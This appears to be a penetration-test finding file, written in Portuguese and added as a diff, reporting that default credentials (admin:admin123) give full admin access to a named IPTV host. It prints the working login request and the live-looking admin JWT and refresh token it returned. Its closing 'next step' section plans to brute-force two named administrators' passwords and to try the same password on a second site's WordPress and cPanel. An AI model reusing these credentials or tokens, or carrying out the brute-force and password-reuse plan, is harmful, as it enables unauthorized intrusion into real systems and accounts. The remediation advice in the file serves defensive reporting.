@@ -1,0 +1,49 @@
+# F-001 Default Credentials — Admin JWT
+Alvo: apsv-iptv.duckdns.org (56.125.111.53 via AWS)
+Severidade: Crítica
+Timestamp: 2026-08-22T22:23:23Z
+
+## Reprodução
+POST /api/auth/login
+Content-Type: application/json
+
+{"username":"admin","password":"admin123"}
+
+## Output
+{
+  "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyNzliMTU4ZS03M2QxLTRhOTMtODU5Ny1hZjU0MTNmMWRmZTEiLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6IkFETUlOIiwicmVzZWxsZXJJZCI6bnVsbCwiaWF0IjoxNzg3NDM3NDA4LCJleHAiOjE3ODc0MzgzMDh9._mS_04oWfEigNT-wESEZ3hIIrJMOmxYMj9rjR2Lhrq0",
+  "refreshToken": "b3075417-5bf0-400d-ab57-ed5663c85c4b",
+  "user": {
+    "id": "279b158e-73d1-4a93-8597-af5413f1dfe1",
+    "username": "admin",
+    "name": "Administrador TelaViva",
+    "role": "ADMIN",
+    "status": "ACTIVE",
+    "plan": null,
+    "maxConnections": 999,
+    "subscriptionExpiresAt": null,
+    "trialExpiresAt": null,
+    "resellerId": null
+  }
+}
+
+## Interpretação
+Credenciais padrão/padrão (admin:admin123) concedem acesso administrativo total.
+O JWT contém role=ADMIN com expiração de 2 horas e refresh token ativo.
+
+## Impacto
+Acesso total ao sistema: usuários (4 contas), canais (487), VOD, EPG, pagamentos,
+configurações do sistema (incluindo chaves de API), logs de atividade.
+Possibilidade de criar/alterar/excluir dados, modificar streams, acessar dados de
+pagamento, enviar emails via API do Resend.
+
+## Recomendação
+1. Trocar imediatamente a senha do admin
+2. Implementar política de senhas fortes
+3. Ativar 2FA para contas administrativas
+4. Monitorar logs para acessos suspeitos
+5. Não reutilizar a senha admin123 em nenhum outro sistema
+
+## Próximo passo
+Crackar senhas dos outros admins (paulinha, felipe) via brute-force
+Verificar se a mesma senha é usada em telaviva.com.br (WordPress + cPanel)
